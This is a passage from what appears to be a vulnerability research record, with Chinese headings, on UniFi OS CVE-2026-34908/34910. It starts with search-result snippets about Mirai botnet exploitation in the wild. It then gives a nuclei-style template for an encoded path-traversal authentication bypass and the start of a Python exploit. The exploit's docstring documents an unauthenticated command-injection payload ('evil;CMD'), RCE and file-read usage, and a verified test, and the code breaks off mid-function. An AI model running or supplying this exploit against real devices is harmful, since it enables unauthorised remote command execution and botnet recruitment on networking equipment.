\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"p\", \"w\", \"n\", \"d\", \"e\", \"f\", \"e\", \"n\", \"d\", \".\", \"c\", \"o\", \"m\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"6\", \"/\", \"0\", \"9\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"4\", \"9\", \"1\", \"0\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"a\", \"t\", \"i\", \"o\", \"n\", \"-\", \"i\", \"t\", \"w\", \"-\", \"b\", \"u\", \"i\", \"l\", \"d\", \"i\", \"n\", \"g\", \"-\", \"a\", \"-\", \"b\", \"o\", \"t\", \"n\", \"e\", \"t\", \"-\", \"m\", \"i\", \"r\", \"a\", \"i\", \"/\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] cyber-threat-observatory/reports/2026-05-22/TIER_2_CVE-2026 ...\n [description] Mar 26, 2026 · CVE-2026-34910 is a Command Injection vulnerability classified under CWE-20 (\"Improper Input Validation\"). It affects Ubiquiti's UniFi OS devices, which are used for managing networking equipment and security systems. The flaw allows an attacker with network access and high privileges to execute arbitrary commands on the affected device. The CVSS score is 10.0 (Critical), indicating a severe ...\n [link] https://github.com/alan-turing-institute/cyber-threat-observatory/blob/main/reports/2026-05-22/TIER_2_CVE-2026-34910.md\n [webpage 0 end]\n[webpage 1 begin] [title] NVD - CVE-2026-34910\n [description] Jun 23, 2026 · CVE-2026-34910 Detail Description A malicious actor with access to the network could exploit an Improper Input Validation vulnerability found in UniFi OS devices to execute a Command Injection.\n [link] https://nvd.nist.gov/vuln/detail/CVE-2026-34910\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - SecureWithUmer/CVE-2026-PoCs: A community-curated ...\n [description] Jul 8, 2026 · CVE-2026-PoCs A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026.\n [link] https://github.com/SecureWithUmer/CVE-2026-PoCs\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-34910 - Exploits & Severity - Feedly\n [description] May 21, 2026 · Threat intelligence report CVE-2026-34910 is a critical vulnerability (CVSS 10.0) due to improper input validation, allowing unauthenticated command injection across various UniFi OS devices. The details regarding exploitation in the wild, proof-of-concept exploits, mitigations, detections, patches, or downstream impacts on third-party vendors are not provided in the available information ...\n [link] https://feedly.com/cve/CVE-2026-34910\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-34910 Exploitation ITW – building a botnet (MIRAI ...\n [description] Jun 9, 2026 · Observed in-the-wild chain: CVE-2026-34908 (access-control/traversal bypass to the localhost updater) → CVE-2026-34910 (command injection via pkg_name) → Mirai loader (zok) drop. So they use part of a CVE and part of another CVE to achieve the outcome, but I’d suggest that they could have just used either CVE if they had full knowledge.\n [link] https://www.pwndefend.com/2026/06/09/cve-2026-34910-exploitation-itw-building-a-botnet-mirai/\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/cbec6b822dcf41033a5ef5687b22d580/CVE-2026-34908-unifi-auth-bypass.yaml\n---\nid: CVE-2026-34908\n\ninfo:\n  name: UniFi OS - Authentication Bypass via Path Traversal (..%2f)\n  author: Boreas37\n  severity: critical\n  description: |\n    UniFi OS devices are vulnerable to an Improper Access Control issue that\n    lets a malicious actor with network access make unauthorized changes to\n    the system. The nginx auth layer treats any request whose RAW URI starts\n    with \"/api/auth/validate-sso/\" as public, but routes by the NORMALIZED URI\n    (decodes %2f to \"/\" and collapses \"../\"). Encoding a traversal makes these\n    diverge, granting unauthenticated access to internal \"/proxy/<service>/\"\n    backends. A request reaching the internal package-update handler proves\n    the bypass without executing anything.\n  impact: |\n    Unauthenticated attacker bypasses authentication to reach internal UniFi\n    OS proxy endpoints and can make unauthorized system changes. Listed in\n    CISA KEV (actively exploited).\n  remediation: |\n    Upgrade UniFi OS to a patched version per Security Advisory Bulletin 064.\n  reference:\n    - https://community.ui.com/releases/Security-Advisory-Bulletin-064-064/84811c09-4cf4-42ab-bd61-cc994445963b\n    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-34908\n    - https://nvd.nist.gov/vuln/detail/CVE-2026-34908\n  classification:\n    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n    cvss-score: 9.8\n    cve-id: CVE-2026-34908\n    cwe-id: CWE-284\n  metadata:\n    max-request: 2\n    verified: true\n    shodan-query: 'http.html:\"unifi\"'\n  tags: cve,cve2026,unifi,ubiquiti,auth-bypass,traversal,kev,unauth\n\nhttp:\n  - raw:\n      - |\n        GET /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package HTTP/1.1\n        Host: {{Hostname}}\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"pkg_name\"\n          - \"required\"\n        condition: and\n\n      - type: status\n        status:\n          - 200\n\n    extractors:\n      - type: kval\n        kval:\n          - status_code\n\n\n---\n/tmp/cbec6b822dcf41033a5ef5687b22d580/CVE-2026-34910.py\n---\n#!/usr/bin/env python3\n\"\"\"\nCVE-2026-34910 — UniFi OS Unauthenticated Command Injection RCE (CVSS 10.0)\nCVE-2026-34909 — UniFi OS Path Traversal Arbitrary File Read (CVSS 10.0)\n\nAffected: UniFi OS Server (all versions prior to Security Advisory Bulletin 064 fixes)\nCWE-20 / CWE-22 · CISA KEV listed (actively exploited by Mirai-derived botnet)\n\nThe nginx auth layer treats any request whose RAW URI starts with\n\"/api/auth/validate-sso/\" as public, but routes by the NORMALIZED URI\n(decodes %2f to \"/\" and collapses \"../\"). Encoding a traversal makes these\ndiverge, granting unauthenticated access to internal \"/proxy/<service>/\"\nbackends. The internal package-update handler (\"latest_package\") then passes\nthe pkg_name parameter into a shell command built as:\n\n    sudo systemctl stop <pkg_name>\n\nwithout sanitisation. Injecting a semicolon (\"evil;CMD\") escapes the systemctl\ncommand and executes CMD as the ucs-update user → unauthenticated RCE in a\nsingle request.\n\nThe same traversal primitive against /app-assets/<svc>/<path> reads files\noff disk (nginx alias misconfiguration) → CVE-2026-34909.\n\nVERIFIED against real UniFi OS Server 5.0.6 (hieutq/unifi-os-server:5.0.6-amd64,\nsetup-completed): pkg_name=evil;touch /tmp/PWNED_34910&by_cmd=true created the\nfile on the target (RCE confirmed). Patched 5.1.21 returns HTTP 400.\n\nUsage:\n    python3 CVE-2026-34910.py <target> <command>            # RCE (34910)\n    python3 CVE-2026-34910.py <target> --check              # auth-bypass probe\n    python3 CVE-2026-34910.py <target> --read <path>        # file read (34909)\n\nExamples:\n    python3 CVE-2026-34910.py https://192.168.1.10:11443 \"id > /tmp/out.txt\"\n    python3 CVE-2026-34910.py https://192.168.1.10:11443 --check\n\"\"\"\n\nimport argparse\nimport sys\nimport urllib.parse\nimport urllib.request\nimport urllib.error\nimport ssl\n\nTRAVERSAL = \"/api/auth/validate-sso/..%2f..%2f..%2f\"\nPACKAGE_UPDATE = \"proxy/users/api/v2/ucs/update/latest_package\"\n\nCTX = ssl.create_default_context()\nCTX.check_hostname = False\nCTX.verify_mode = ssl.CERT_NONE\n\n\ndef request(target: str, path: str, params: dict | None = None, method: str = \"GET\") -> tuple[int, str]:\n    url = target.rstrip(\"/\") + path\n    if params:\n        url += \"?\" + urllib.parse.urlencode(params)\n    req = urllib.request.Request(url, method=method)\n    req.add_header(\"User-Agent\", \"